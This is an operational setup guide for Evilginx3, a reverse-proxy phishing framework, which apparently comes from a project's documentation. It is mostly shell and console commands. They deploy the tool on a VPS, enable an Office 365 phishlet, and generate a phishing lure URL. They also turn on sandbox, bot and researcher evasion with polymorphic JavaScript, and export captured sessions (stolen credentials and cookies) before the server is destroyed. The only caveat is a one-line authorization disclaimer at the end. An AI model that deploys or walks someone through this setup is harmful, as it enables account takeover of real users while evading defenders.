# Evilginx3 Linux VPS Setup Guide

## Complete setup guide for deploying Evilginx3 on a remote Linux VPS via SSH.

---

## Prerequisites

- Linux VPS (Ubuntu 20.04+ or Debian 11+)
- SSH access with root privileges
- Domain name
- Cloudflare account (free tier)

---

## Step 1: Connect to Your VPS

### From Windows

```powershell
# Using PowerShell
ssh root@YOUR_VPS_IP

# Or use PuTTY (download from putty.org)
# Enter IP, Port 22, Connection Type: SSH
```

### From Linux/Mac

```bash
ssh root@YOUR_VPS_IP
```

Enter your password when prompted.

---

## Step 2: Upload Evilginx3 to VPS

### Option A: Clone from Git Repository

```bash
# Install git if not present
apt-get update
apt-get install -y git

# Clone repository
cd /root
git clone https://github.com/yourusername/evilginx3.git
cd evilginx3
```

### Option B: Upload via SCP (from your local machine)

```bash
# From Windows PowerShell or Linux terminal (NOT on VPS)
scp -r C:\Users\user\Desktop\git\Evilginx3 root@YOUR_VPS_IP:/root/

# Then SSH to VPS
ssh root@YOUR_VPS_IP
cd /root/Evilginx3
```

---

## Step 3: Run the One-Click Installer

```bash
# Make sure you're in the Evilginx3 directory
cd /root/evilginx3  # or /root/Evilginx3

# Run the installer
bash install.sh
```

**The installer will:**
1. Ask for authorization confirmation (type `yes`)
2. Ask to proceed with installation (type `yes`)
3. Update system packages
4. Install Go 1.22.0
5. Install dependencies (curl, wget, git, etc.)
6. Build Evilginx from source
7. Stop conflicting services (Apache2, Nginx, BIND9)
8. Configure UFW firewall (ports 22, 53, 80, 443)
9. Set up fail2ban for SSH protection
10. Create systemd service with auto-start
11. Install evilginx command system-wide

**Installation time:** 5-10 minutes

---

## Step 4: Run Evilginx

After installation completes, just run:

```bash
sudo evilginx
```

That's it! No need to specify paths - everything is auto-configured.

---

## Step 5: Initial Configuration

In the Evilginx console:

```bash
# Set your domain
config domain yourdomain.com

# Set your VPS IP address
config ipv4 external YOUR_VPS_IP

# Enable automatic certificates (Let's Encrypt)
config autocert on

# Set lure generation strategy (NEW feature!)
config lure_strategy realistic

# View all settings
config
```

---

## Step 6: Configure Cloudflare DNS (Recommended)

### In Evilginx Console:

```bash
config dns_provider cloudflare
config dns_api_key YOUR_CLOUDFLARE_API_TOKEN
config dns_email YOUR_CLOUDFLARE_EMAIL
config dns_enabled true
```

### Get Cloudflare API Token:

1. Login to [Cloudflare Dashboard](https://dash.cloudflare.com)
2. Go to "My Profile" → "API Tokens"
3. Click "Create Token"
4. Use "Edit zone DNS" template
5. Select your domain
6. Copy the token

---

## Step 7: Enable Advanced Features

```bash
# Machine Learning Bot Detection
config ml_detection on
config ml_threshold 0.75

# JA3 TLS Fingerprinting
config ja3_detection on

# Sandbox Detection
config sandbox_detection on
config sandbox_mode active

# Polymorphic JavaScript Engine
config polymorphic on
config mutation_level high

# Traffic Shaping
config traffic_shaping on
config per_ip_rate_limit 60
```

---

## Step 8: Setup a Phishlet

```bash
# List available phishlets
phishlets

# Configure hostname for O365
phishlets hostname o365 login.yourdomain.com

# Enable the phishlet
phishlets enable o365

# Verify
phishlets
```

---

## Step 9: Create a Lure

```bash
# Create lure
lures create o365

# Configure redirect URL
lures edit 0 redirect_url https://office.com

# Optional: Set redirector for extra legitimacy
lures edit 0 redirector o365_turnstile

# Set info for tracking
lures edit 0 info "Campaign 1 - IT Staff"

# Get the phishing URL
lures get-url 0
```

Copy this URL - this is your phishing link!

---

## Step 10: Run as Service (Background Mode)

### Exit Interactive Mode

Press `Ctrl+C` to exit the Evilginx console.

### Start as Service

```bash
# Start Evilginx as background service
evilginx-start

# Check status
evilginx-status

# View logs in real-time
evilginx-logs
```

The service will auto-start on reboot.

---

## Available Commands

### Direct Commands

```bash
sudo evilginx              # Run interactively (auto-loads paths)
```

### Service Commands

```bash
evilginx-start             # Start service
evilginx-stop              # Stop service
evilginx-restart           # Restart service
evilginx-status            # Check status
evilginx-logs              # View live logs
```

### Systemd Commands

```bash
systemctl start evilginx
systemctl stop evilginx
systemctl restart evilginx
systemctl status evilginx
journalctl -u evilginx -f
```

---

## Monitoring

### View Sessions

```bash
# Run evilginx interactively
sudo evilginx

# In console:
sessions                    # List all sessions
sessions get SESSION_ID     # View session details
```

### Check Logs

```bash
# Live logs
evilginx-logs

# Or manually
journalctl -u evilginx -n 100
tail -f /var/log/evilginx/*.log
```

### Telegram Notifications (Optional)

```bash
# In Evilginx console:
config telegram_token YOUR_BOT_TOKEN
config telegram_chat YOUR_CHAT_ID
config telegram on

# Test it
telegram test
```

---

## Firewall Configuration

The installer automatically configures UFW:

```bash
# Check firewall status
sudo ufw status

# Manually add rules if needed
sudo ufw allow 22/tcp
sudo ufw allow 53
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
```

---

## Troubleshooting

### Port Already in Use

```bash
# Check what's using port 443
sudo lsof -i :443

# Stop conflicting service
sudo systemctl stop apache2
sudo systemctl stop nginx

# Restart Evilginx
evilginx-restart
```

### DNS Not Resolving

```bash
# Test DNS
dig @8.8.8.8 yourdomain.com

# Check Evilginx DNS server
dig @localhost yourdomain.com

# Verify Cloudflare nameservers
dig NS yourdomain.com +short
```

### Certificate Issues

```bash
# Ensure port 80 is accessible (for ACME challenge)
sudo ufw allow 80/tcp

# Check domain points to VPS
dig yourdomain.com +short

# Should return your VPS IP
```

### Service Won't Start

```bash
# Check detailed status
systemctl status evilginx -l

# View recent logs
journalctl -u evilginx -n 50

# Run in debug mode
sudo evilginx -debug
```

---

## Security Recommendations

### 1. Secure SSH Access

```bash
# Edit SSH config
nano /etc/ssh/sshd_config

# Change these settings:
PermitRootLogin no           # Disable root login after creating user
PasswordAuthentication no    # Use SSH keys only
Port 2222                   # Change SSH port (optional)

# Restart SSH
systemctl restart sshd
```

### 2. Keep System Updated

```bash
# Update regularly
apt-get update && apt-get upgrade -y
```

### 3. Monitor Logs

```bash
# Watch for anomalies
evilginx-logs

# Check for security researchers
grep "bot" /var/log/evilginx/*.log
```

---

## Post-Engagement Cleanup

### Export Captured Data

```bash
# Run evilginx
sudo evilginx

# Export sessions
sessions export /tmp/sessions_$(date +%Y%m%d).json

# Exit
exit
```

### Download to Local Machine

```bash
# From your local machine (NOT on VPS)
scp root@YOUR_VPS_IP:/tmp/sessions_*.json ~/
```

### Uninstall Evilginx

```bash
# On VPS
sudo bash uninstall.sh
```

### Destroy VPS

After exporting data and uninstalling, destroy the VPS from your provider's dashboard (DigitalOcean, Vultr, etc.)

---

## Complete Example Session

```bash
# 1. SSH to VPS
ssh root@123.45.67.89

# 2. Clone repository
git clone https://github.com/yourusername/evilginx3.git
cd evilginx3

# 3. Run installer
bash install.sh
# Type 'yes' twice when prompted

# 4. After installation, run Evilginx
sudo evilginx

# 5. Configure
config domain evil.com
config ipv4 external 123.45.67.89
config autocert on
config lure_strategy realistic

# 6. Enable phishlet
phishlets hostname o365 login.evil.com
phishlets enable o365

# 7. Create lure
lures create o365
lures edit 0 redirect_url https://office.com
lures get-url 0

# 8. Exit and start service
# Press Ctrl+C
evilginx-start

# 9. Monitor
evilginx-logs
```

---

## Quick Reference

### Installation
```bash
bash install.sh
```

### Run
```bash
sudo evilginx              # Interactive mode
evilginx-start             # Background service
```

### Monitor
```bash
evilginx-status            # Service status
evilginx-logs              # Live logs
sudo evilginx              # Interactive (view sessions)
```

### Uninstall
```bash
bash uninstall.sh
```

---

**For complete deployment documentation, see:**
- `DEPLOYMENT_GUIDE.md` - Comprehensive deployment guide
- `README.md` - Feature overview
- `BEST_PRACTICES.md` - Security best practices

**Installation complete! Use responsibly with proper authorization.**

